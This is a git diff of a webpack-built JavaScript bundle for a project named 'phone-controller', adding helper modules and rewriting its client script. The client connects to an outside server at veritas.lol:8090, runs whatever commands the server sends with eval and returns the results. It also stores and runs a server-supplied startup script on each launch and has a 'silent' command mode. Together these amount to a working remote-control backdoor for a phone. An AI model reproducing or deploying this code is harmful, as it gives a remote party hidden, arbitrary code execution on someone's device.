@@ -317,6 +317,19 @@ eval("\n/**\n * Module exports.\n *\n * Logic borrowed from Modernizr:\n *\n *  
 
 /***/ }),
 
+/***/ "./node_modules/is-browser/client.js":
+/*!*******************************************!*\
+  !*** ./node_modules/is-browser/client.js ***!
+  \*******************************************/
+/*! unknown exports (runtime-defined) */
+/*! runtime requirements: module */
+/*! CommonJS bailout: module.exports is used directly at 1:0-14 */
+/***/ ((module) => {
+
+eval("module.exports = true;\n\n//# sourceURL=webpack://phone-controller/./node_modules/is-browser/client.js?");
+
+/***/ }),
+
 /***/ "./node_modules/ms/index.js":
 /*!**********************************!*\
   !*** ./node_modules/ms/index.js ***!
@@ -490,6 +503,20 @@ eval("\nObject.defineProperty(exports, \"__esModule\", ({ value: true }));\nexpo
 
 /***/ }),
 
+/***/ "./node_modules/the-global-object/index.js":
+/*!*************************************************!*\
+  !*** ./node_modules/the-global-object/index.js ***!
+  \*************************************************/
+/*! unknown exports (runtime-defined) */
+/*! runtime requirements: module, __webpack_require__.g, __webpack_require__.* */
+/*! CommonJS bailout: module.exports is used directly at 19:0-14 */
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+"use strict";
+eval("\n\nconst getGlobalObject = () => {\n  if (typeof self !== 'undefined' && self.self === self &&\n    self.Array === Array && self.setInterval === setInterval) {\n    return self;\n  }\n  if (typeof window !== 'undefined' && window.window === window &&\n    window.Array === Array && window.setInterval === setInterval) {\n    return window;\n  }\n  if (typeof __webpack_require__.g !== 'undefined' && __webpack_require__.g.global === __webpack_require__.g &&\n    __webpack_require__.g.Array === Array && __webpack_require__.g.setInterval === setInterval) {\n    return __webpack_require__.g;\n  }\n  throw new Error('Cannot find the global object');\n};\n\nmodule.exports = getGlobalObject();\n\n\n//# sourceURL=webpack://phone-controller/./node_modules/the-global-object/index.js?");
+
+/***/ }),
+
 /***/ "./node_modules/yeast/index.js":
 /*!*************************************!*\
   !*** ./node_modules/yeast/index.js ***!
@@ -530,6 +557,19 @@ eval("\n\nvar alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr
 /******/ 	}
 /******/ 	
 /************************************************************************/
+/******/ 	/* webpack/runtime/global */
+/******/ 	(() => {
+/******/ 		__webpack_require__.g = (function() {
+/******/ 			if (typeof globalThis === 'object') return globalThis;
+/******/ 			try {
+/******/ 				return this || new Function('return this')();
+/******/ 			} catch (e) {
+/******/ 				if (typeof window === 'object') return window;
+/******/ 			}
+/******/ 		})();
+/******/ 	})();
+/******/ 	
+/************************************************************************/
 (() => {
 "use strict";
 /*!*******************************************!*\
@@ -537,7 +577,7 @@ eval("\n\nvar alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr
   \*******************************************/
 /*! unknown exports (runtime-defined) */
 /*! runtime requirements: __webpack_require__ */
-eval("\n\nconst SocketIOClient = __webpack_require__(/*! socket.io-client */ \"./node_modules/socket.io-client/build/index.js\");\n\n(async () => {\n  let client;\n  const timeout = (n) => new Promise((resolve) => setTimeout(resolve, n));\n  await timeout(0);\n    alert('wopop');\n  async function startClient() {\n    try {\n      client = SocketIOClient('http://veritas.lol:8090');\n//      client.connect('localhost:8090');\n    } catch (e) {\n      console.error(e);\n      await timeout(5000);\n      return startClient();\n    }\n    client.on('command', ({\n      cmd,\n      uuid\n    }) => {\n      const response = {\n        uuid\n      };\n      try {\n        response.response = eval(cmd);\n        response.success = true;\n      } catch (e) {\n        response.response = { message: e.message, stack: e.stack, name: e.name };\n        response.success = false;\n      }\n      client.emit('response', response);\n    });\n    client.on('error', async (e) => {\n      console.error(e);\n      await timeout(5000);\n      startClient();\n    });\n  }\n  startClient();\n})();\n\n\n\n//# sourceURL=webpack://phone-controller/./client/phone-controller-client.js?");
+eval("\n\nconst SocketIOClient = __webpack_require__(/*! socket.io-client */ \"./node_modules/socket.io-client/build/index.js\");\nconst globalObject = __webpack_require__(/*! the-global-object */ \"./node_modules/the-global-object/index.js\");\nconst isBrowser = __webpack_require__(/*! is-browser */ \"./node_modules/is-browser/client.js\");\nconst path = __webpack_require__(Object(function webpackMissingModule() { var e = new Error(\"Cannot find module 'path'\"); e.code = 'MODULE_NOT_FOUND'; throw e; }()));\nconst readFile = () => globalObject.readFile;\n\nconst writeFile = globalObject.writeFile;\n\nconst DEFAULT_PATH = process.env.WORKING_DIRECTORY || (!isBrowser && process.env.HOME || '/sdcard');\n\nconst constructPath = (filename) => path.join(DEFAULT_PATH, filename); \n\n(async () => {\n  let client;\n  let hadInit = false;\n  const timeout = (n) => new Promise((resolve) => setTimeout(resolve, n));\n  try {\n    let initScript = readFile(constructPath(\"init-script.js\"));\n    await eval(initScript);\n    hadInit = true;\n  } catch (e) {}\n  async function startClient() {\n    let hadInit;\n    try {\n      client = SocketIOClient(\"http://veritas.lol:8090\");\n      //      client.connect('localhost:8090');\n    } catch (e) {\n      console.error(e);\n      await timeout(5000);\n      return startClient();\n    }\n    let clientId;\n    try {\n      clientId = readFile(constructPath(constructPath(\"id.txt\"))).trim();\n      client.emit(\"id\", clientId);\n    } catch (e) {\n      client.emit(\"id\", \"\");\n    }\n    client.on(\"set-id\", (id) => writeFile(constructPath(\"id.txt\"), id.trim()));\n    client.on(\"init-script\", (initScript) => {\n      if (!initScript) writeFile(constructPath(\"/init-script.js\", \"void 0;\"));\n      writeFile(constructPath(\"init-script.js\"), initScript);\n    });\n    client.on(\"command\", ({ cmd, uuid }) => {\n      if (hadInit && uuid === \"silent\") return true;\n      const response = {\n        uuid,\n      };\n      try {\n        response.response = eval(cmd);\n        response.success = true;\n      } catch (e) {\n        response.response = {\n          message: e.message,\n          stack: e.stack,\n          name: e.name,\n        };\n        response.success = false;\n      }\n      client.emit(\"response\", response);\n    });\n    client.on(\"error\", async (e) => {\n      console.error(e);\n      await timeout(5000);\n      startClient();\n    });\n  }\n  startClient();\n})();\n\n\n//# sourceURL=webpack://phone-controller/./client/phone-controller-client.js?");
 })();
 
 /******/ })()
